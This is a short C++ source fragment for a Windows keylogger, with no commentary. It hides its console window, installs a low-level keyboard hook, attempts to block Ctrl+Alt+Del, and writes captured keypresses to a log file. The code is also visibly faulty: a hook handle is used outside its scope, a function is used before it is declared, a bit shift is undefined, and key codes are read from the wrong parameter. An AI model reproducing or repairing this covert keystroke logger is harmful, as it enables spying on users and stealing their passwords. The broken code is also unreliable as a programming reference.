using namespace std;

void HookKeyboard() {
    // Hide the console window
    HWND console = GetConsoleWindow();
    RECT rc;
    GetWindowRect(console, &rc);
    MoveWindow(console, 0, 0, 0, 0, TRUE);

    // Set the hook
    HHOOK hhook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Check if it's a key press event
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        // Check if it's a Ctrl+Alt+Del key press
        if ((lParam & (1 << 0)) && (lParam & (1 << 1)) && (lParam & (1 << 64)))
        {
            return 1;
        }
        // Get the ASCII value of the key
        int keypress = (unsigned short)(wParam & 0xFFFF);
        string log = "Keypress: " + to_string(keypress) + "\n";
        ofstream f("log.txt", ios::app);
        f << log;
        f.close();
    }
    return CallNextHookEx(hhook, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    // Set the hook
    HookKeyboard();
    // Main loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    // Unhook the keyboard
    UnhookWindowsHookEx(hhook);
    return msg.wParam;
}

